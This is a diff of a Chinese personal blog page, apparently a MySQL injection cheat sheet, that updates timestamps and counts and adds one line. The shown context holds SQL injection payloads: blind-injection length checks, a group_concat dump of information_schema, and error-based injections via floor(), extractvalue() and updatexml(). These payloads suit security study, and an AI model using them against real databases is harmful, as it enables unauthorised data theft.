@@ -88,7 +88,7 @@
 <meta property="og:site_name" content="xianyu123&#39;s Blog">
 <meta property="og:description" content="mysql注入备忘录">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-03-30T10:26:46.541Z">
+<meta property="og:updated_time" content="2020-06-04T13:19:23.242Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="mysql注入备忘录">
 <meta name="twitter:description" content="mysql注入备忘录">
@@ -514,7 +514,7 @@
 <h4 id="值的长度"><a href="#值的长度" class="headerlink" title="值的长度"></a>值的长度</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.借助group_concat求值长度的方法</span><br><span class="line">ascii(mid(length((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">id</span>,<span class="keyword">name</span>) <span class="keyword">from</span> 库名.表名)),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">49</span></span><br></pre></td></tr></table></figure>
 <h4 id="值-1"><a href="#值-1" class="headerlink" title="值"></a>值</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(字段<span class="number">1</span>,字段<span class="number">2</span> separator <span class="number">0x2c</span>) <span class="keyword">from</span> 库名.表名</span><br></pre></td></tr></table></figure>
 <h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">user</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></figure>
-<h3 id="extractvalue-有长度限制-最长32位"><a href="#extractvalue-有长度限制-最长32位" class="headerlink" title="extractvalue()(有长度限制,最长32位)"></a>extractvalue()(有长度限制,最长32位)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> table_id <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</span><br></pre></td></tr></table></figure>
+<h3 id="extractvalue-有长度限制-最长32位"><a href="#extractvalue-有长度限制-最长32位" class="headerlink" title="extractvalue()(有长度限制,最长32位)"></a>extractvalue()(有长度限制,最长32位)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> table_id <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</span><br></pre></td></tr></table></figure>
 <h3 id="updatexml-有长度限制-最长32位"><a href="#updatexml-有长度限制-最长32位" class="headerlink" title="updatexml()(有长度限制,最长32位)"></a>updatexml()(有长度限制,最长32位)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,<span class="keyword">mid</span>((<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">10</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
 <h3 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a>geometrycollection()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h3 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a>multipoint()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -604,7 +604,7 @@
   <p><span>本文标题:</span><a href="/2019/01/25/mysql注入备忘录/">mysql注入备忘录</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 xianyu123 的个人博客">xianyu123</a></p>
   <p><span>发布时间:</span>2019年01月25日 - 21:57</p>
-  <p><span>最后更新:</span>2020年03月30日 - 18:26</p>
+  <p><span>最后更新:</span>2020年06月04日 - 21:19</p>
   <p><span>原始链接:</span><a href="/2019/01/25/mysql注入备忘录/" title="mysql注入备忘录">http://0clickjacking0.github.io/2019/01/25/mysql注入备忘录/</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://0clickjacking0.github.io/2019/01/25/mysql注入备忘录/" aria-label="复制成功！"></i></span>
   </p>
@@ -750,7 +750,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">47</span>
+                  <span class="site-state-item-count">49</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -761,7 +761,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
